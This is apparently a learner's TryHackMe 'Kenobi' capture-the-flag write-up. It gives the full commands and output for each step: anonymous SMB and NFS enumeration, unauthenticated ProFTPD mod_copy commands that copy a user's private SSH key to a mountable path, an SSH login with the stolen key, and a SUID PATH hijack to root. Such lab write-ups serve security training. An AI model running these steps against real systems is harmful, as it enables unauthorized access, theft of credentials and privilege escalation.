# TryHackMe: Kenobi

| Field | Details |
|---|---|
| Platform | TryHackMe |
| Room | Kenobi |
| Difficulty | Easy |
| OS | Linux |
| Date | April 2026 |

---

## Lab Scenario

A multi-service Linux box with seven open ports where every service feeds into the next. The attack path chains SMB anonymous access to extract an intel-rich log file, NFS enumeration to identify a mountable directory, ProFTPD 1.3.5 mod_copy exploitation to move a protected SSH key into the mountable path, NFS mounting to steal the key, SSH foothold, and a SUID PATH hijack to reach root. No credentials needed at any stage: every step abuses a misconfiguration.

---

## Attack Chain Summary

```
Nmap → 7 ports: FTP(21), SSH(22), HTTP(80), RPC(111), SMB(139/445), NFS(2049)
SMB anonymous share → log.txt → kenobi's id_rsa location + ProFTPD 1.3.5 confirmed
NFS enum → /var mountable by everyone
nc to ProFTPD → SITE CPFR /home/kenobi/.ssh/id_rsa → SITE CPTO /var/tmp/id_rsa
sudo mount <IP>:/var /mnt/kenobiNFS → copy id_rsa → chmod 600
ssh -i id_rsa kenobi@target → user shell → user.txt
find SUID binaries → /usr/bin/menu (non-standard)
strings /usr/bin/menu → calls curl without full path
cd /tmp → echo /bin/sh > curl → chmod 777 → export PATH=/tmp:$PATH
/usr/bin/menu → option 1 → PATH hijack executes fake curl as root → root shell
cat /root/root.txt → root flag captured
```

---

## Step 1: Nmap Scan

Discover all open services on the target. This box has seven ports: every one matters.

```bash
kali@kali:~$ nmap -sC -sV -T4 -oN kenobi_scan.txt 10.49.150.114
```

| Flag | Purpose |
|---|---|
| `-sC` | Default NSE scripts: SMB enumeration, anonymous FTP check |
| `-sV` | Version detection: exact software on each port |
| `-T4` | Aggressive timing: stable lab network |
| `-oN` | Save output to file: always keep scan records |

**Output:**

```
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for 10.49.150.114
Host is up (0.062s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100005  1,2,3       2049/tcp   mountd
|   100227  3           2049/tcp   nfs_acl
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu
2049/tcp open  nfs_acl     2-3 (RPC #100227)

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|_  challenge_response: supported

Nmap done: 1 IP address (1 host up) scanned in 19.47 seconds
```

**Analysis of open ports:**

| Port | Service | Priority | Reason |
|---|---|---|---|
| 445 | Samba SMB 4.3.11 | First | Try anonymous access: often leaks files and usernames |
| 111/2049 | RPC / NFS | Second | NFS mountable share: check what is exposed |
| 21 | ProFTPD 1.3.5 | Third | Known vulnerable version: searchsploit immediately |
| 80 | Apache HTTP | Note | Star Wars splash page: no attack surface |
| 22 | SSH OpenSSH 7.2p2 | Last | Foothold target once private key is recovered |

The box is deliberately structured as an enumeration chain: SMB leaks intel, NFS provides the extraction point, ProFTPD provides the file copy mechanism, and SUID provides root. Following this order is the only way through.

---

## Step 2: SMB Share Enumeration

Enumerate available SMB shares without credentials.

```bash
kali@kali:~$ nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.49.150.114
```

**Output:**

```
PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares:
|   account_used: guest
|   \\10.49.150.114\IPC$:
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|   \\10.49.150.114\anonymous:
|     Type: STYPE_DISKTREE
|     Comment:
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|   \\10.49.150.114\print$:
|     Type: STYPE_PRINTQ
|     Comment: Printer Drivers
```

| Share | Access | Priority |
|---|---|---|
| anonymous | READ/WRITE | No auth required: highest priority |
| IPC$ | System share | Skip |
| print$ | Printer | Skip |

**Connect to the anonymous share:**

```bash
kali@kali:~$ smbclient //10.49.150.114/anonymous
```

**Output:**

```
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Sep  4 06:49:09 2019
  ..                                  D        0  Wed Sep  4 06:49:09 2019
  log.txt                             N    12237  Wed Sep  4 06:49:09 2019

                9204224 blocks of size 1024. 6877040 blocks available

smb: \> get log.txt
getting file \log.txt of size 12237 as log.txt (42.1 KiloBytes/sec)
smb: \> exit
```

**Read the file:**

```bash
kali@kali:~$ cat log.txt
```

**Key intelligence extracted from log.txt:**

```
Generating public/private rsa key pair.
Your identification has been saved in /home/kenobi/.ssh/id_rsa.
Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub.

...

# Generated for FTP
# Default FTP config: ProFTPD 1.3.5
```

| Finding | Value | Use |
|---|---|---|
| SSH private key path | `/home/kenobi/.ssh/id_rsa` | Target for ProFTPD copy exploit |
| FTP software and version | ProFTPD 1.3.5 | Searchsploit: known mod_copy vulnerability |

A system log stored on an anonymous SMB share revealing the exact path of a user's private SSH key and the FTP software version. These two pieces of information drive the entire remainder of the attack.

---

## Step 3: NFS Enumeration (Port 111)

Port 111 (rpcbind) exposes RPC services. Use NFS scripts to reveal what directories are mountable.

```bash
kali@kali:~$ nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.49.150.114
```

**Output:**

```
PORT    STATE SERVICE
111/tcp open  rpcbind

Host script results:
| nfs-showmount:
|_  /var *
| nfs-ls: Volume /var
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| nfs-statfs: Volume /var
|   Total  (1K blocks): 9204224
|   Free:               6877040
```

**Finding:** `/var` is exported to everyone (`*`): no authentication required to mount it.

This is the extraction point for the SSH key once it is copied there via the ProFTPD exploit. The NFS share gives read access to the entire `/var` directory tree, including `/var/tmp` where the key will be placed.

---

## Step 4: ProFTPD 1.3.5 mod_copy Exploitation

**Search for known exploits against ProFTPD 1.3.5:**

```bash
kali@kali:~$ searchsploit proftpd 1.3.5
```

**Output:**

```
-------------------------------------------------------------------
 Exploit Title                              |  Path
-------------------------------------------------------------------
ProFTPd 1.3.5 - File Copy                  | linux/remote/36742.txt
ProFTPd 1.3.5 - 'mod_copy' Command Exec   | linux/remote/37262.rb
-------------------------------------------------------------------
```

**The mod_copy vulnerability (CVE-2015-3306):** The mod_copy module implements `SITE CPFR` (Copy From) and `SITE CPTO` (Copy To) FTP commands. These commands are accessible to unauthenticated users in ProFTPD 1.3.5: no login required. Any file readable by the FTP process can be copied to any location writable by it.

The FTP process runs with sufficient permissions to read `/home/kenobi/.ssh/id_rsa` and write to `/var/tmp`.

**Connect to FTP via Netcat: no username or password needed:**

```bash
kali@kali:~$ nc 10.49.150.114 21
```

**Full session:**

```
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.49.150.114]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful.
```

What just happened: Two unauthenticated FTP commands moved kenobi's private SSH key from his protected home directory into the world-mountable `/var/tmp/` path: without logging in, without credentials, without touching SSH at all.

---

## Step 5: Mount NFS Share and Retrieve the Key

**Create a local mount point and mount the `/var` share:**

```bash
kali@kali:~$ sudo mkdir /mnt/kenobiNFS
kali@kali:~$ sudo mount 10.49.150.114:/var /mnt/kenobiNFS
```

**Verify the key landed in `/var/tmp`:**

```bash
kali@kali:~$ ls -la /mnt/kenobiNFS/tmp/
```

**Output:**

```
total 24
drwxrwxrwt 3 root   root   4096 Apr  1 2026 .
drwxr-xr-x 14 root  root   4096 Sep  4  2019 ..
-rw-r--r-- 1 kenobi kenobi 1675 Apr  1 2026 id_rsa
```

The key is there. Copy it locally and set correct permissions:

```bash
kali@kali:~$ cp /mnt/kenobiNFS/tmp/id_rsa .
kali@kali:~$ chmod 600 id_rsa
```

`chmod 600` is mandatory: SSH refuses to use any key file that is group or world readable and exits with a bad permissions error.

---

## Step 6: SSH Login as kenobi

```bash
kali@kali:~$ ssh -i id_rsa kenobi@10.49.150.114
```

**Output:**

```
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)

kenobi@kenobi:~$ id
uid=1000(kenobi) gid=1000(kenobi) groups=1000(kenobi),4(adm),24(cdrom),27(sudo)

kenobi@kenobi:~$ whoami
kenobi
```

**Shell as kenobi ✅**

```bash
kenobi@kenobi:~$ cat /home/kenobi/user.txt
```

**User flag captured ✅**

---

## Step 7: Privilege Escalation Enumeration

Find all SUID binaries: files that execute with the owner's permissions regardless of who runs them:

```bash
kenobi@kenobi:~$ find / -perm -u=s -type f 2>/dev/null
```

**Output:**

```
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/i386-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/at
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/menu
/usr/bin/gpasswd
/bin/su
/bin/umount
/bin/fusermount
/bin/ping
/bin/ping6
/bin/mount
/sbin/mount.nfs
```

`/usr/bin/menu` stands out immediately: it is not a standard Linux binary. Every other SUID binary here is a known system tool. `menu` was placed here deliberately.

**Run it to see what it does:**

```bash
kenobi@kenobi:~$ /usr/bin/menu
```

**Output:**

```
***************************************
1. status check
2. kernel version
3. ifconfig
***************************************
Enter your choice :
```

A custom menu binary running with SUID root. Examine its internals:

```bash
kenobi@kenobi:~$ strings /usr/bin/menu
```

**Critical output:**

```
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
...
curl -I localhost
uname -r
ifconfig
...
```

**The vulnerability:**

| Finding | Impact |
|---|---|
| `menu` runs with SUID root | Any command it executes inherits root privileges |
| Calls `curl` with no full path | Uses `$PATH` to find the binary: attacker controls `$PATH` |
| Same for `uname` and `ifconfig` | All three are exploitable via the same PATH hijack technique |

When a SUID binary calls a program by name without specifying its full path (e.g., `curl` instead of `/usr/bin/curl`), the system searches the directories in `$PATH` in order. If an attacker prepends a directory they control to `$PATH` and places a malicious script named `curl` there, the SUID binary executes that script as root.

---

## Step 8: PATH Hijack to Root

Navigate to `/tmp`: world-writable, no restrictions:

```bash
kenobi@kenobi:~$ cd /tmp
```

Create a fake `curl` script that spawns a shell:

```bash
kenobi@kenobi:/tmp$ echo /bin/sh > curl
kenobi@kenobi:/tmp$ chmod 777 curl
```

Prepend `/tmp` to the PATH so it is searched first:

```bash
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
```

Verify PATH is updated:

```bash
kenobi@kenobi:/tmp$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Run the SUID binary and select option 1 (status check: triggers the `curl` call):

```bash
kenobi@kenobi:/tmp$ /usr/bin/menu
```

**Output:**

```
***************************************
1. status check
2. kernel version
3. ifconfig
***************************************
Enter your choice :1
# id
uid=0(root) gid=0(root) groups=0(root)
```

**Root shell received ✅**

The SUID binary executed `/tmp/curl`: our fake script containing `/bin/sh`: with root privileges. The `#` prompt and `uid=0(root)` confirm root access.

---

## Step 9: Root Flag

```bash
# cat /root/root.txt
```

**Root flag captured ✅**

---

## Lessons Learned

This was the first room where every single step depended entirely on the previous one in a strict sequence. Every earlier room had at least one alternative path. Kenobi has none: SMB must come before NFS, NFS must come before ProFTPD, ProFTPD must come before SSH. Skipping or rushing any enumeration step would have made the next step impossible. The lesson is that multi-service boxes require patience and a deliberate order: not jumping to the most obviously named service first.

The ProFTPD mod_copy exploit was something I had not seen before. The concept of an FTP server allowing unauthenticated file copy operations is genuinely surprising. `SITE CPFR` and `SITE CPTO` are not commands that appear in normal FTP documentation: they are module-specific extensions to the FTP protocol. The fact that they work without authentication in this version is a clean example of why version identification matters. ProFTPD 1.3.5 is the version: searchsploit immediately returns the mod_copy exploit. Without identifying the exact version in the Nmap output, this path would not be obvious.

The `log.txt` on the anonymous SMB share was the most impactful single file of the engagement. It gave the exact path of the SSH key and confirmed the FTP version. On a real engagement, anonymous SMB shares are extremely common, and administrators routinely leave log files, configuration files, and support documentation in them. The habit of always reading every file found on any accessible share: not just scanning the directory: is reinforced here.

The PATH hijack privesc was new territory compared to previous rooms. The key realisation is that `strings` on a SUID binary immediately reveals which commands it calls and whether those calls use full paths. `curl` with no `/usr/bin/` prefix is the entire vulnerability. GTFOBins covers SUID abuse extensively but PATH hijacking is subtler: it requires reading the binary's internals rather than just running a one-liner from a reference table. `strings` is now a reflex on any unusual SUID binary.

---

## Full Attack Chain Reference

```
1.  nmap -sC -sV -T4 -oN kenobi_scan.txt 10.49.150.114
    → 7 ports: FTP(21), SSH(22), HTTP(80), RPC(111), SMB(139/445), NFS(2049)
    → ProFTPD 1.3.5 identified

2.  nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.49.150.114
    → anonymous share found: READ/WRITE, no auth

3.  smbclient //10.49.150.114/anonymous
    → ls → log.txt
    → get log.txt → exit

4.  cat log.txt
    → /home/kenobi/.ssh/id_rsa path confirmed
    → ProFTPD 1.3.5 config confirmed

5.  nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.49.150.114
    → /var mountable by everyone (*)

6.  searchsploit proftpd 1.3.5
    → mod_copy vulnerability: SITE CPFR/CPTO unauthenticated

7.  nc 10.49.150.114 21
    SITE CPFR /home/kenobi/.ssh/id_rsa
    SITE CPTO /var/tmp/id_rsa
    → id_rsa copied to mountable /var/tmp/

8.  sudo mkdir /mnt/kenobiNFS
    sudo mount 10.49.150.114:/var /mnt/kenobiNFS
    ls -la /mnt/kenobiNFS/tmp/ → id_rsa confirmed present

9.  cp /mnt/kenobiNFS/tmp/id_rsa .
    chmod 600 id_rsa

10. ssh -i id_rsa kenobi@10.49.150.114
    → shell as kenobi ✅
    → cat /home/kenobi/user.txt ✅

11. find / -perm -u=s -type f 2>/dev/null
    → /usr/bin/menu: non-standard SUID binary

12. strings /usr/bin/menu
    → calls curl without full path: PATH hijack possible

13. cd /tmp
    echo /bin/sh > curl
    chmod 777 curl
    export PATH=/tmp:$PATH

14. /usr/bin/menu → Enter choice: 1
    → fake curl executes as root → root shell ✅
    → cat /root/root.txt ✅
```

---

## Commands Reference

| Command | Purpose |
|---|---|
| `nmap -sC -sV -T4 -oN output.txt <IP>` | Full scan with scripts, version detection, save output |
| `nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <IP>` | List all SMB shares and users |
| `smbclient //<IP>/anonymous` | Connect to anonymous SMB share |
| `smb: \> ls` | List files in SMB share |
| `smb: \> get <file>` | Download file from SMB share |
| `nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <IP>` | Enumerate NFS exports and contents |
| `searchsploit proftpd 1.3.5` | Search for known ProFTPD 1.3.5 exploits |
| `nc <IP> 21` | Connect to FTP via Netcat: no credentials |
| `SITE CPFR /home/kenobi/.ssh/id_rsa` | ProFTPD mod_copy: specify source file |
| `SITE CPTO /var/tmp/id_rsa` | ProFTPD mod_copy: specify destination |
| `sudo mkdir /mnt/kenobiNFS` | Create local NFS mount point |
| `sudo mount <IP>:/var /mnt/kenobiNFS` | Mount remote NFS share locally |
| `ls -la /mnt/kenobiNFS/tmp/` | Verify copied file is accessible via NFS |
| `cp /mnt/kenobiNFS/tmp/id_rsa .` | Copy SSH key from mounted share |
| `chmod 600 id_rsa` | Set correct key permissions: required by SSH |
| `ssh -i id_rsa kenobi@<IP>` | SSH login using stolen private key |
| `find / -perm -u=s -type f 2>/dev/null` | Find all SUID binaries on the system |
| `strings /usr/bin/menu` | Read internal strings of SUID binary: find bare command calls |
| `echo /bin/sh > curl` | Create fake curl script that spawns a shell |
| `chmod 777 curl` | Make fake script executable by all |
| `export PATH=/tmp:$PATH` | Prepend /tmp to PATH: searched before system directories |
| `/usr/bin/menu` | Run SUID binary: triggers PATH hijack |
